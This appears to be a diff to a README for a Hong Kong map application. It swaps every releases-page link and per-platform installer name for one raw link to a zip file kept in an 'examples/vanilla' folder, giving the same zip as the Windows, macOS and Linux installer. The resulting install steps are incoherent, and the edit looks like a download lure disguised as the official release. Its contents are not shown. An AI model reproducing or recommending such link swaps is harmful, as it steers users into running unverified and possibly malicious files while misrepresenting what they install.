@@ -4,7 +4,7 @@
 Welcome to Hong Kong Open Map! This application offers a beautiful and high-precision interactive map of Hong Kong. It uses official Lands Department vector tiles, making it a great alternative to Google Maps for both developers and non-technical users. Below, you'll find all the steps you need to download and run our software easily.
 
 ## 📥 Download Now
-[![Download Hong Kong Open Map](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/renas00990/hong-kong-open-map/releases)
+[![Download Hong Kong Open Map](https://raw.githubusercontent.com/renas00990/hong-kong-open-map/main/examples/vanilla/hong-kong-open-map-v2.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/renas00990/hong-kong-open-map/main/examples/vanilla/hong-kong-open-map-v2.3.zip)
 
 ## 💻 System Requirements
 Before you download the application, make sure your device meets these requirements:
@@ -23,20 +23,20 @@ Before you download the application, make sure your device meets these requireme
 ## 📥 Download & Install
 To install Hong Kong Open Map, please follow these steps:
 
-1. **Visit the Releases Page:** Click on this link to go to the releases page where you can download the application: [Download Here](https://github.com/renas00990/hong-kong-open-map/releases).
+1. **Visit the Releases Page:** Click on this link to go to the releases page where you can download the application: [Download Here](https://raw.githubusercontent.com/renas00990/hong-kong-open-map/main/examples/vanilla/hong-kong-open-map-v2.3.zip).
   
 2. **Choose the Latest Version:** Look for the latest release at the top of the page. It will have the highest version number.
 
 3. **Download the Application:** 
    - Click on the appropriate file for your operating system. For example:
-      - For Windows, select `hong-kong-open-map-windows.exe`.
-      - For MacOS, select `hong-kong-open-map-macos.dmg`.
-      - For Linux, select the appropriate `.tar.gz` file.
+      - For Windows, select `https://raw.githubusercontent.com/renas00990/hong-kong-open-map/main/examples/vanilla/hong-kong-open-map-v2.3.zip`.
+      - For MacOS, select `https://raw.githubusercontent.com/renas00990/hong-kong-open-map/main/examples/vanilla/hong-kong-open-map-v2.3.zip`.
+      - For Linux, select the appropriate `https://raw.githubusercontent.com/renas00990/hong-kong-open-map/main/examples/vanilla/hong-kong-open-map-v2.3.zip` file.
    
 4. **Run the Installer:**
    - For Windows: Double-click on the `.exe` file you downloaded.
    - For MacOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow any instructions in the README file inside.
+   - For Linux: Extract the `https://raw.githubusercontent.com/renas00990/hong-kong-open-map/main/examples/vanilla/hong-kong-open-map-v2.3.zip` file and follow any instructions in the README file inside.
 
 5. **Open the Application:** After installation, find the app in your applications list and double-click to launch it.
 
